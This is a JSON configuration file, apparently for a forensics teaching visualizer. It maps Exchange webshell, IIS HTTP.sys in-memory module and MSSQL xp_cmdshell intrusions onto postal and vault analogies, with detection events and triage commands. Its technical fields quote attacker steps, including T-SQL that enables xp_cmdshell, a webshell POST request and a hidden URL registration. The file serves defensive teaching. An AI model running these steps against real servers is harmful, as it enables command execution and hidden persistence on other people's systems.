          "storyTerm": "Deleted wall flyer",
          "technicalTerm": "Removed source .aspx file still evidenced by build artifacts",
          "tone": "emerald"
        }
      ],
      "accentHex": "#F43F5E",
      "secondaryHex": "#10B981",
      "durationSec": 15,
      "callouts": [
        {
          "id": "net-exchange-proxylogon-step-3-left",
          "tag": "STEP 3 · FOCUS",
          "title": "Compiled proof plates",
          "subtitle": "Compiled DLLs in Temporary ASP.NET Files cache",
          "tone": "amber"
        },
        {
          "id": "net-exchange-proxylogon-step-3-right",
          "tag": "STEP 3 · ACTION",
          "title": "Mailroom clerk process",
          "subtitle": "IIS w3wp.exe worker handling the webshell request",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Even If",
          "stageTag": "STEP 03 · SETUP",
          "title": "Compiled proof plates",
          "storyExcerpt": "Even if the intruder tears down the wall flyer afterward, the building print shop retains freshly compiled proof plates in its temporary drawer and security cameras catch the mailroom clerk…",
          "technicalParallel": "Under the hood, the observed step executes Sysmon EventID 11: C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\Temporary ASP.NET Files\\root\\...\\App_Web_supp.aspx.cdcab7d2.dll (which executes the technical…",
          "accentHex": "#38BDF8",
          "startSec": 0,
          "endSec": 5
        },
        {
          "id": 2,
          "shortLabel": "2. Uses",
          "stageTag": "STEP 03 · MECHANISM",
          "title": "Mailroom clerk process",
          "storyExcerpt": "Inside the facility, the hidden mechanism uses mailroom clerk process to advance toward heavy workshop tools.",
          "technicalParallel": "When the external actor requests POST /aspnet_client/supp.aspx, IIS w3wp.exe compiles the page via csc.exe into C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\Temporary ASP.NET…",
          "accentHex": "#F59E0B",
          "startSec": 5,
          "endSec": 10.2
        },
        {
          "id": 3,
          "shortLabel": "3. Wall",
          "stageTag": "STEP 03 · EVIDENCE",
          "title": "Deleted wall flyer",
          "storyExcerpt": "Behind the scenes, deleted wall flyer captures the unmistakable footprint of the intrusion.",
          "technicalParallel": "Documented in Sysmon Event 1 (recording EventID=1 , Sysmon ProcessCreate + 11 , Temporary ASP.NET DLL, ParentAppPool=w3wp.exe -ap \"MSExchangeOWAAppPool\" , SYSTEM, CompiledAssemblyArtifact=Temporary…",
          "accentHex": "#10B981",
          "startSec": 10.2,
          "endSec": 15
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Front Desk",
          "position": [
            -5.6,
            4.2,
            8.4
          ],
          "target": [
            -4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Mail Archive",
          "position": [
            5.6,
            4.2,
            8.4
          ],
          "target": [
            4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Audit Sweep",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ],
      "mitreId": "T1505.003"
    }
  },
  "dfir-iis-w3wp-http-sys-kernel-cache-in-memory-webshell": {
    "briefing": {
      "scenarioId": "dfir-iis-w3wp-http-sys-kernel-cache-in-memory-webshell",
      "sectionKey": "briefing",
      "sceneKind": "net-iis-httpsys-briefing",
      "stageBadge": "BRIEFING #0 · END-TO-END STORY DIORAMA",
      "mitreId": "T1505.004",
      "title": "IIS HTTP.sys Kernel URI Registration & In-Memory Module Forensics — Story-to-Technical Overview",
      "storyCue": "A busy postal depot leaves its public storefront wall spotless so routine walk-through checks find no suspicious flyers, yet an insider registers a hidden sorting desk deep inside the basement mail chute that intercepts specific letters before they ever reach the front counter.",
      "technicalCue": "PERSISTENCE: Native/Managed IIS Module Registration in applicationHost.config (Sysmon EventID 7 & 11) -> DEFENSE EVASION: Kernel-Mode HTTP.sys URI UrlGroup Registration (HttpService/Operational EventID 113) -> CREDENTIAL ACCESS: Live Triage via netsh http show servicestate & .NET CLR AppDomain Inspection",
      "storyMappings": [
        {
          "storyTerm": "Busy postal depot",
          "technicalTerm": "Microsoft IIS web server and w3wp.exe worker process",
          "tone": "amber"
        },
        {
          "storyTerm": "Hidden sorting desk ledger",
          "technicalTerm": "Malicious module registered in applicationHost.config",
          "tone": "sky"
        },
        {
          "storyTerm": "Basement mail chute",
          "technicalTerm": "Kernel-mode HTTP.sys URI UrlGroup listener",
          "tone": "rose"
        },
        {
          "storyTerm": "Live basement inspection",
          "technicalTerm": "netsh http show servicestate and CLR AppDomain triage",
          "tone": "emerald"
        }
      ],
      "accentHex": "#22D3EE",
      "secondaryHex": "#F43F5E",
      "durationSec": 18,
      "callouts": [
        {
          "id": "net-iis-httpsys-b-left",
          "tag": "ENTRY & STORY WORLD",
          "title": "Busy postal depot",
          "subtitle": "Microsoft IIS web server and w3wp.exe worker process",
          "tone": "amber"
        },
        {
          "id": "net-iis-httpsys-b-right",
          "tag": "TARGET MECHANISM",
          "title": "Hidden sorting desk ledger",
          "subtitle": "Malicious module registered in applicationHost.config",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Busy",
          "stageTag": "STAGE 01 · PERSISTENCE",
          "title": "Native/Managed IIS Module Registration in applicationHost.config (Sysmon EventID 7 & 11)",
          "storyExcerpt": "Inspectors open the depot master staffing roster and spot a newly added sorting clerk assigned to inspect every incoming envelope, even though no corresponding script paper sits on the public bulletin…",
          "technicalParallel": "Under the hood, the observed step executes C:\\Windows\\System32\\inetsrv\\appcmd.exe list modules (which executes the technical command / telemetry directive , C:\\Windows\\System32\\inetsrv\\appcmd.exe list…",
          "accentHex": "#22D3EE",
          "startSec": 0,
          "endSec": 6
        },
        {
          "id": 2,
          "shortLabel": "2. Desk",
          "stageTag": "STAGE 02 · DEFENSE EVASION",
          "title": "Kernel-Mode HTTP.sys URI UrlGroup Registration (HttpService/Operational EventID 113)",
          "storyExcerpt": "Digging deeper into the basement conveyor switchboard, investigators discover a private chute reservation claiming a secret corridor address directly inside the building core driver.",
          "technicalParallel": "Under the hood, the observed step executes Win32 API: httpapi.dll!HttpAddUrlToUrlGroup(UrlGroupId, L\"https://+:443/owa/auth/Current/themes/health/\"...) (which executes the technical command / telemetry…",
          "accentHex": "#22D3EE",
          "startSec": 6,
          "endSec": 12
        },
        {
          "id": 3,
          "shortLabel": "3. Live Roll",
          "stageTag": "STAGE 03 · CREDENTIAL ACCESS",
          "title": "Live Triage via netsh http show servicestate & .NET CLR AppDomain Inspection",
          "storyExcerpt": "Rather than trusting paper folders, responders run a live roll call of every active chute reservation and inspect the working trays inside the mailroom clerks hands to expose the memory-resident helper.",
          "technicalParallel": "Under the hood, the observed step executes netsh http show servicestate view=requestq verbose=yes (which executes the technical command / telemetry directive , netsh http show servicestate view=requestq…",
          "accentHex": "#F43F5E",
          "startSec": 12,
          "endSec": 18
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Postal Depot",
          "position": [
            -5.6,
            4.2,
            8.4
          ],
          "target": [
            -4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Kernel Cache",
          "position": [
            5.6,
            4.2,
            8.4
          ],
          "target": [
            4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Memory Scan",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ]
    },
    "step-1": {
      "scenarioId": "dfir-iis-w3wp-http-sys-kernel-cache-in-memory-webshell",
      "sectionKey": "step-1",
      "sceneKind": "net-iis-httpsys-step-1",
      "stageBadge": "STEP #1 · PERSISTENCE",
      "title": "Native/Managed IIS Module Registration in applicationHost.config (Sysmon EventID 7 & 11)",
      "storyCue": "Inspectors open the depot master staffing roster and spot a newly added sorting clerk assigned to inspect every incoming envelope, even though no corresponding script paper sits on the public bulletin board.",
      "technicalCue": "T1505.004 · PERSISTENCE — To intercept every incoming HTTP request to the server without dropping an .aspx file into C:\\inetpub\\wwwroot\\, the actor registers a malicious native or .NET IHttpModule inside…",
      "storyMappings": [
        {
          "storyTerm": "Depot master staffing roster",
          "technicalTerm": "IIS applicationHost.config global module list",
          "tone": "amber"
        },
        {
          "storyTerm": "Newly added sorting clerk",
          "technicalTerm": "Rogue native DLL or managed IIS HTTP module",
          "tone": "sky"
        },
        {
          "storyTerm": "Spotless bulletin board",
          "technicalTerm": "Absence of traditional .aspx webshell files on disk",
          "tone": "rose"
        },
        {
          "storyTerm": "Roster change alert",
          "technicalTerm": "Sysmon file modification and IIS configuration logs",
          "tone": "emerald"
        }
      ],
      "accentHex": "#22D3EE",
      "secondaryHex": "#22D3EE",
      "durationSec": 15,
      "callouts": [
        {
          "id": "net-iis-httpsys-step-1-left",
          "tag": "STEP 1 · FOCUS",
          "title": "Depot master staffing roster",
          "subtitle": "IIS applicationHost.config global module list",
          "tone": "amber"
        },
        {
          "id": "net-iis-httpsys-step-1-right",
          "tag": "STEP 1 · ACTION",
          "title": "Newly added sorting clerk",
          "subtitle": "Rogue native DLL or managed IIS HTTP module",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Open Spot",
          "stageTag": "STEP 01 · SETUP",
          "title": "Depot master staffing roster",
          "storyExcerpt": "Inspectors open the depot master staffing roster and spot a newly added sorting clerk assigned to inspect every incoming envelope, even though no corresponding script paper sits on the public…",
          "technicalParallel": "Under the hood, the observed step executes C:\\Windows\\System32\\inetsrv\\appcmd.exe list modules (which executes the technical command / telemetry directive , C:\\Windows\\System32\\inetsrv\\appcmd.exe list…",
          "accentHex": "#22D3EE",
          "startSec": 0,
          "endSec": 5
        },
        {
          "id": 2,
          "shortLabel": "2. Uses",
          "stageTag": "STEP 01 · MECHANISM",
          "title": "Newly added sorting clerk",
          "storyExcerpt": "Inside the facility, the hidden mechanism uses newly added sorting clerk to advance toward spotless bulletin board.",
          "technicalParallel": "To intercept every incoming HTTP request to the server without dropping an .aspx file into C:\\inetpub\\wwwroot\\, the actor registers a malicious native or .NET IHttpModule inside…",
          "accentHex": "#F59E0B",
          "startSec": 5,
          "endSec": 10.2
        },
        {
          "id": 3,
          "shortLabel": "3. Open Spot",
          "stageTag": "STEP 01 · EVIDENCE",
          "title": "Roster change alert",
          "storyExcerpt": "Behind the scenes, roster change alert captures the unmistakable footprint of the intrusion.",
          "technicalParallel": "Documented in Sysmon Event 7 (recording HostProcess=C:\\Windows\\System32\\inetsrv\\w3wp.exe, LoadedIisModule=C:\\Windows\\System32\\inetsrv\\DiagnosticsCompression.dll…",
          "accentHex": "#10B981",
          "startSec": 10.2,
          "endSec": 15
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Postal Depot",
          "position": [
            -4.3,
            4.2,
            8.4
          ],
          "target": [
            -2.8,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Kernel Cache",
          "position": [
            6.3,
            4.2,
            8.4
          ],
          "target": [
            4.8,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Memory Scan",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ],
      "mitreId": "T1505.004"
    },
    "step-2": {
      "scenarioId": "dfir-iis-w3wp-http-sys-kernel-cache-in-memory-webshell",
      "sectionKey": "step-2",
      "sceneKind": "net-iis-httpsys-step-2",
      "stageBadge": "STEP #2 · DEFENSE EVASION",
      "title": "Kernel-Mode HTTP.sys URI UrlGroup Registration (HttpService/Operational EventID 113)",
      "storyCue": "Digging deeper into the basement conveyor switchboard, investigators discover a private chute reservation claiming a secret corridor address directly inside the building core driver.",
      "technicalCue": "T1505.004 · DEFENSE EVASION — Alternatively, a post-exploitation implant calls HttpAddUrlToUrlGroup (httpapi.dll) to register a dedicated URI prefix (https://+:443/owa/auth/Current/themes/health/) directly in the kernel…",
      "storyMappings": [
        {
          "storyTerm": "Basement conveyor switchboard",
          "technicalTerm": "Windows kernel-mode HTTP.sys request router",
          "tone": "amber"
        },
        {
          "storyTerm": "Private chute reservation",
          "technicalTerm": "Registered HTTP.sys URI UrlGroup prefix",
          "tone": "sky"
        },
        {
          "storyTerm": "Switchboard operational log",
          "technicalTerm": "Microsoft-Windows-HttpService/Operational event log",
          "tone": "rose"
        },
        {
          "storyTerm": "Front counter bypass",
          "technicalTerm": "Requests intercepted before standard IIS site logging",
          "tone": "emerald"
        }
      ],
      "accentHex": "#F59E0B",
      "secondaryHex": "#22D3EE",
      "durationSec": 15,
      "callouts": [
        {
          "id": "net-iis-httpsys-step-2-left",
          "tag": "STEP 2 · FOCUS",
          "title": "Basement conveyor switchboard",
          "subtitle": "Windows kernel-mode HTTP.sys request router",
          "tone": "amber"
        },
        {
          "id": "net-iis-httpsys-step-2-right",
          "tag": "STEP 2 · ACTION",
          "title": "Private chute reservation",
          "subtitle": "Registered HTTP.sys URI UrlGroup prefix",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Core",
          "stageTag": "STEP 02 · SETUP",
          "title": "Basement conveyor switchboard",
          "storyExcerpt": "Digging deeper into the basement conveyor switchboard, investigators discover a private chute reservation claiming a secret corridor address directly inside the building core driver.",
          "technicalParallel": "Under the hood, the observed step executes Win32 API: httpapi.dll!HttpAddUrlToUrlGroup(UrlGroupId, L\"https://+:443/owa/auth/Current/themes/health/\"...) (which executes the technical command / telemetry…",
          "accentHex": "#22D3EE",
          "startSec": 0,
          "endSec": 5
        },
        {
          "id": 2,
          "shortLabel": "2. Uses Log",
          "stageTag": "STEP 02 · MECHANISM",
          "title": "Private chute reservation",
          "storyExcerpt": "Inside the facility, the hidden mechanism uses private chute reservation to advance toward switchboard operational log.",
          "technicalParallel": "Alternatively, a post-exploitation implant calls HttpAddUrlToUrlGroup (httpapi.dll) to register a dedicated URI prefix (https://+:443/owa/auth/Current/themes/health/) directly in the kernel HTTP.sys…",
          "accentHex": "#F59E0B",
          "startSec": 5,
          "endSec": 10.2
        },
        {
          "id": 3,
          "shortLabel": "3. Core",
          "stageTag": "STEP 02 · EVIDENCE",
          "title": "Front counter bypass",
          "storyExcerpt": "Behind the scenes, front counter bypass captures the unmistakable footprint of the intrusion.",
          "technicalParallel": "Documented in WinEvent Event 113 (recording LogChannel=Microsoft-Windows-HttpService/Operational, EventID=113 , Added URL to HTTP.sys URL Group…",
          "accentHex": "#10B981",
          "startSec": 10.2,
          "endSec": 15
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Postal Depot",
          "position": [
            -5.6,
            4.2,
            8.4
          ],
          "target": [
            -4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Kernel Cache",
          "position": [
            5.6,
            4.2,
            8.4
          ],
          "target": [
            4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Memory Scan",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ],
      "mitreId": "T1505.004"
    },
    "step-3": {
      "scenarioId": "dfir-iis-w3wp-http-sys-kernel-cache-in-memory-webshell",
      "sectionKey": "step-3",
      "sceneKind": "net-iis-httpsys-step-3",
      "stageBadge": "STEP #3 · CREDENTIAL ACCESS",
      "title": "Live Triage via netsh http show servicestate & .NET CLR AppDomain Inspection",
      "storyCue": "Rather than trusting paper folders, responders run a live roll call of every active chute reservation and inspect the working trays inside the mailroom clerks hands to expose the memory-resident helper.",
      "technicalCue": "T1505.004 · CREDENTIAL ACCESS — During live DFIR triage, the responder executes netsh http show servicestate view=requestq verbose=yes, which enumerates every active HTTP.sys kernel request queue, Registered URLs, and the…",
      "storyMappings": [
        {
          "storyTerm": "Live chute roll call",
          "technicalTerm": "netsh http show servicestate active queue listing",
          "tone": "amber"
        },
        {
          "storyTerm": "Clerk working trays",
          "technicalTerm": "Live .NET CLR AppDomain loaded assemblies in w3wp.exe",
          "tone": "sky"
        },
        {
          "storyTerm": "Memory-resident helper",
          "technicalTerm": "In-memory IIS webshell without a disk-backed page",
          "tone": "rose"
        },
        {
          "storyTerm": "Depot worker process",
          "technicalTerm": "Active IIS w3wp.exe host process",
          "tone": "emerald"
        }
      ],
      "accentHex": "#F43F5E",
      "secondaryHex": "#10B981",
      "durationSec": 15,
      "callouts": [
        {
          "id": "net-iis-httpsys-step-3-left",
          "tag": "STEP 3 · FOCUS",
          "title": "Live chute roll call",
          "subtitle": "netsh http show servicestate active queue listing",
          "tone": "amber"
        },
        {
          "id": "net-iis-httpsys-step-3-right",
          "tag": "STEP 3 · ACTION",
          "title": "Clerk working trays",
          "subtitle": "Live .NET CLR AppDomain loaded assemblies in w3wp.exe",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Live Roll",
          "stageTag": "STEP 03 · SETUP",
          "title": "Live chute roll call",
          "storyExcerpt": "Rather than trusting paper folders, responders run a live roll call of every active chute reservation and inspect the working trays inside the mailroom clerks hands to expose the…",
          "technicalParallel": "Under the hood, the observed step executes netsh http show servicestate view=requestq verbose=yes (which executes the technical command / telemetry directive , netsh http show servicestate view=requestq…",
          "accentHex": "#22D3EE",
          "startSec": 0,
          "endSec": 5
        },
        {
          "id": 2,
          "shortLabel": "2. Uses",
          "stageTag": "STEP 03 · MECHANISM",
          "title": "Clerk working trays",
          "storyExcerpt": "Inside the facility, the hidden mechanism uses clerk working trays to advance toward memory-resident helper.",
          "technicalParallel": "During live DFIR triage, the responder executes netsh http show servicestate view=requestq verbose=yes, which enumerates every active HTTP.sys kernel request queue, Registered URLs, and the exact owning…",
          "accentHex": "#F59E0B",
          "startSec": 5,
          "endSec": 10.2
        },
        {
          "id": 3,
          "shortLabel": "3. Than Run",
          "stageTag": "STEP 03 · EVIDENCE",
          "title": "Depot worker process",
          "storyExcerpt": "Behind the scenes, depot worker process captures the unmistakable footprint of the intrusion.",
          "technicalParallel": "Documented in WinEvent Event 200 (recording TriageCommand=netsh http show servicestate view=requestq verbose=yes, RogueProcessId=6104 , C:\\Windows\\System32\\dllhost.exe…",
          "accentHex": "#10B981",
          "startSec": 10.2,
          "endSec": 15
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Postal Depot",
          "position": [
            -5.6,
            4.2,
            8.4
          ],
          "target": [
            -4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Kernel Cache",
          "position": [
            5.6,
            4.2,
            8.4
          ],
          "target": [
            4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Memory Scan",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ],
      "mitreId": "T1505.004"
    }
  },
  "dfir-mssql-xp-cmdshell-sp-oacreate-sqlservr-audit-trace": {
    "briefing": {
      "scenarioId": "dfir-mssql-xp-cmdshell-sp-oacreate-sqlservr-audit-trace",
      "sectionKey": "briefing",
      "sceneKind": "net-mssql-xpcmd-briefing",
      "stageBadge": "BRIEFING #0 · END-TO-END STORY DIORAMA",
      "mitreId": "T1059.003",
      "title": "MSSQL xp_cmdshell / Ole Automation Reconfiguration (EventID 15457) &… — Story-to-Technical Overview",
      "storyCue": "A vault bookkeeper is supposed to only file and fetch account ledgers, never operate the building workshop. Investigators trace an intrusion where a privileged caller unlocks the bookkeeper hidden workshop switch, loads two helper toolkits to run floor commands, and installs a permanent custom stamp inside the vault catalog.",
      "technicalCue": "EXECUTION: sp_configure Reconfiguration of show advanced options & xp_cmdshell (Application EventID 15457) -> EXECUTION: xplog70.dll / odsole70.dll Module Load & sqlservr.exe Child Shell Execution (Sysmon EventID 1 & 7) -> PERSISTENCE: CLR Stored Procedure Persistence (sys.assemblies) & Default Trace (.trc) Forensics",
      "storyMappings": [
        {
          "storyTerm": "Vault bookkeeper engine",
          "technicalTerm": "Microsoft SQL Server sqlservr.exe database service",
          "tone": "amber"
        },
        {
          "storyTerm": "Hidden workshop switch",
          "technicalTerm": "sp_configure enabling advanced options and xp_cmdshell",
          "tone": "sky"
        },
        {
          "storyTerm": "Two helper toolkits",
          "technicalTerm": "Loaded xplog70.dll and odsole70.dll server modules",
          "tone": "rose"
        },
        {
          "storyTerm": "Permanent custom catalog stamp",
          "technicalTerm": "Malicious CLR assembly persisted in sys.assemblies",
          "tone": "emerald"
        }
      ],
      "accentHex": "#F59E0B",
      "secondaryHex": "#F43F5E",
      "durationSec": 18,
      "callouts": [
        {
          "id": "net-mssql-xpcmd-b-left",
          "tag": "ENTRY & STORY WORLD",
          "title": "Vault bookkeeper engine",
          "subtitle": "Microsoft SQL Server sqlservr.exe database service",
          "tone": "amber"
        },
        {
          "id": "net-mssql-xpcmd-b-right",
          "tag": "TARGET MECHANISM",
          "title": "Hidden workshop switch",
          "subtitle": "sp_configure enabling advanced options and xp_cmdshell",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Lock",
          "stageTag": "STAGE 01 · EXECUTION",
          "title": "sp_configure Reconfiguration of show advanced options & xp_cmdshell (Application EventID 15457)",
          "storyExcerpt": "First, investigators inspect the vault configuration book and see two safety locks flipped open in rapid succession: one exposing hidden settings and a second enabling the direct workshop command lever.",
          "technicalParallel": "Under the hood, the observed step executes T-SQL: EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; (which executes privileged T-SQL stored…",
          "accentHex": "#F59E0B",
          "startSec": 0,
          "endSec": 6
        },
        {
          "id": 2,
          "shortLabel": "2. Two Off",
          "stageTag": "STAGE 02 · EXECUTION",
          "title": "xplog70.dll / odsole70.dll Module Load & sqlservr.exe Child Shell Execution (Sysmon EventID 1 & 7)",
          "storyExcerpt": "Moments later, the bookkeeper pulls two specialized hardware libraries off the shelf, one built for shell commands and another for external automation objects, and immediately spawns an office command…",
          "technicalParallel": "Under the hood, the observed step executes Sysmon EventID 7: Image=sqlservr.exe ImageLoaded=...\\MSSQL\\Binn\\xplog70.dll (or odsole70.dll) (which executes a structured SQL query or database administration…",
          "accentHex": "#22D3EE",
          "startSec": 6,
          "endSec": 12
        },
        {
          "id": 3,
          "shortLabel": "3. Even If",
          "stageTag": "STAGE 03 · PERSISTENCE",
          "title": "CLR Stored Procedure Persistence (sys.assemblies) & Default Trace (.trc) Forensics",
          "storyExcerpt": "To maintain quiet access even if the workshop lever is locked again, the intruder registers an unsigned custom extension right inside the vault catalog while leaving a clear audit trail inside the…",
          "technicalParallel": "Under the hood, the observed step executes T-SQL Forensics: SELECT name, permission_set_desc, create_date FROM sys.assemblies WHERE is_user_defined = 1; (which executes a structured SQL query or database…",
          "accentHex": "#F43F5E",
          "startSec": 12,
          "endSec": 18
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Vault Ledger",
          "position": [
            -5.6,
            4.2,
            8.4
          ],
          "target": [
            -4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Hidden Switch",
          "position": [
            5.6,
            4.2,
            8.4
          ],
          "target": [
            4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Audit Trace",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ]
    },
    "step-1": {
      "scenarioId": "dfir-mssql-xp-cmdshell-sp-oacreate-sqlservr-audit-trace",
      "sectionKey": "step-1",
      "sceneKind": "net-mssql-xpcmd-step-1",
      "stageBadge": "STEP #1 · EXECUTION",
      "title": "sp_configure Reconfiguration of show advanced options & xp_cmdshell (Application EventID 15457)",
      "storyCue": "First, investigators inspect the vault configuration book and see two safety locks flipped open in rapid succession: one exposing hidden settings and a second enabling the direct workshop command lever.",
      "technicalCue": "T1059.003 · EXECUTION — Because xp_cmdshell and Ole Automation Procedures are disabled by default (value 0), the attacker executes sp_configure \"show advanced options\", 1; RECONFIGURE; followed by sp_configure…",
      "storyMappings": [
        {
          "storyTerm": "First safety lock",
          "technicalTerm": "sp_configure show advanced options set to 1",
          "tone": "amber"
        },
        {
          "storyTerm": "Direct workshop command lever",
          "technicalTerm": "sp_configure xp_cmdshell or Ole Automation enabled",
          "tone": "sky"
        },
        {
          "storyTerm": "Vault configuration book",
          "technicalTerm": "MSSQL ERRORLOG and EventID 15457 reconfiguration logs",
          "tone": "rose"
        },
        {
          "storyTerm": "Privileged caller badge",
          "technicalTerm": "Compromised sysadmin or sa database account",
          "tone": "emerald"
        }
      ],
      "accentHex": "#F59E0B",
      "secondaryHex": "#F59E0B",
      "durationSec": 15,
      "callouts": [
        {
          "id": "net-mssql-xpcmd-step-1-left",
          "tag": "STEP 1 · FOCUS",
          "title": "First safety lock",
          "subtitle": "sp_configure show advanced options set to 1",
          "tone": "amber"
        },
        {
          "id": "net-mssql-xpcmd-step-1-right",
          "tag": "STEP 1 · ACTION",
          "title": "Direct workshop command lever",
          "subtitle": "sp_configure xp_cmdshell or Ole Automation enabled",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Lock",
          "stageTag": "STEP 01 · SETUP",
          "title": "First safety lock",
          "storyExcerpt": "First, investigators inspect the vault configuration book and see two safety locks flipped open in rapid succession: one exposing hidden settings and a second enabling the direct workshop…",
          "technicalParallel": "Under the hood, the observed step executes T-SQL: EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; (which executes privileged T-SQL stored…",
          "accentHex": "#F59E0B",
          "startSec": 0,
          "endSec": 5
        },
        {
          "id": 2,
          "shortLabel": "2. Uses Book",
          "stageTag": "STEP 01 · MECHANISM",
          "title": "Direct workshop command lever",
          "storyExcerpt": "Inside the facility, the hidden mechanism uses direct workshop command lever to advance toward vault configuration book.",
          "technicalParallel": "Because xp_cmdshell and Ole Automation Procedures are disabled by default (value 0), the attacker executes sp_configure \"show advanced options\", 1; RECONFIGURE; followed by sp_configure \"xp_cmdshell\", 1…",
          "accentHex": "#F59E0B",
          "startSec": 5,
          "endSec": 10.2
        },
        {
          "id": 3,
          "shortLabel": "3. Book",
          "stageTag": "STEP 01 · EVIDENCE",
          "title": "Privileged caller badge",
          "storyExcerpt": "Behind the scenes, privileged caller badge captures the unmistakable footprint of the intrusion.",
          "technicalParallel": "Documented in WinEvent Event 15457 (recording LogChannel=Application , Source: MSSQLSERVER & SQL ERRORLOG, EventID=15457 , Configuration Option Changed, ConfigurationOption=xp_cmdshell , 0 -> 1 under…",
          "accentHex": "#10B981",
          "startSec": 10.2,
          "endSec": 15
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Vault Ledger",
          "position": [
            -4.3,
            4.2,
            8.4
          ],
          "target": [
            -2.8,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Hidden Switch",
          "position": [
            6.3,
            4.2,
            8.4
          ],
          "target": [
            4.8,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Audit Trace",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ],
      "mitreId": "T1059.003"
    },
    "step-2": {
      "scenarioId": "dfir-mssql-xp-cmdshell-sp-oacreate-sqlservr-audit-trace",
      "sectionKey": "step-2",
      "sceneKind": "net-mssql-xpcmd-step-2",
      "stageBadge": "STEP #2 · EXECUTION",
      "title": "xplog70.dll / odsole70.dll Module Load & sqlservr.exe Child Shell Execution (Sysmon EventID 1 & 7)",
      "storyCue": "Moments later, the bookkeeper pulls two specialized hardware libraries off the shelf, one built for shell commands and another for external automation objects, and immediately spawns an office command console directly beneath the ledger desk.",
      "technicalCue": "T1059.003 · EXECUTION — When the attacker invokes EXEC master..xp_cmdshell (or sp_OACreate \"WScript.Shell\"), sqlservr.exe loads C:\\Program Files\\Microsoft SQL Server\\MSSQL16.MSSQLSERVER\\MSSQL\\Binn\\xplog70.dll (or…",
      "storyMappings": [
        {
          "storyTerm": "Shell command toolkit",
          "technicalTerm": "xplog70.dll module backing xp_cmdshell execution",
          "tone": "amber"
        },
        {
          "storyTerm": "External automation toolkit",
          "technicalTerm": "odsole70.dll module backing sp_OACreate execution",
          "tone": "sky"
        },
        {
          "storyTerm": "Bookkeeper parent process",
          "technicalTerm": "sqlservr.exe database engine binary",
          "tone": "rose"
        },
        {
          "storyTerm": "Office command console",
          "technicalTerm": "Child cmd.exe or powershell.exe spawned by sqlservr.exe",
          "tone": "emerald"
        }
      ],
      "accentHex": "#F59E0B",
      "secondaryHex": "#F59E0B",
      "durationSec": 15,
      "callouts": [
        {
